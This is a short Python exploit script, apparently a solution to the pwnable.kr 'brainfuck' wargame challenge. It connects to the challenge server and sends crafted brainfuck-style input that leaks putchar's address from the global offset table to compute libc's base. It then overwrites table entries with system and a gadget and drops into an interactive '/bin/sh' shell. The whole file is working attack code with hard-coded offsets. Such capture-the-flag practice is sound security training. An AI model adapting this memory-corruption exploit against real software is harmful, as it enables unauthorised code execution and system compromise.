import struct
import socket
import telnetlib
from hexdump import *
def read_until(s,string):
	r = ""
	while not r.endswith(string):
		tmp = s.recv(1)
		if not tmp: break
		r += tmp
	return r

#s = socket.create_connection(['0',1234])
s = socket.create_connection(['pwnable.kr',9001])
raw_input()
abinsh = '/bin/sh\x00'
print read_until(s,'[ ]\n')
dat = ""
dat += "AAAA"*3
dat += struct.pack('<I',0x80484b0)
dat += "AAAA"
dat += struct.pack('<I',0x804a0a8)
dat += "<"*112
dat += ".>.>.>.>"
dat += "<"*(8+4)
dat += ",>,>,>,>"
dat += ">"*4
dat += ",>,>,>,>"
dat += ">"*116
dat += ",>"*len(abinsh)
dat += '.'
s.send(dat+'\n')
putchar_ = struct.unpack('<I',read_until(s,'\xf7'))[0]
print hex(putchar_)
'''
[server]
putchar_ = 0x677d0
system_ = 0x3f0b0
gadget = 0x2f986
[local]
putchar_ = 0x61800
system_ = 0x3ad80
gadget = 0xd1704
'''
libc_base = putchar_ - 0x677d0 -6
system = libc_base + 0x3f0b0
gadget = libc_base + 0x2f986
print hex(libc_base)
print hex(system)
s.send(struct.pack('<I',system))
s.send(struct.pack('<I',gadget))
s.send(abinsh)
t = telnetlib.Telnet()
t.sock = s
t.interact()
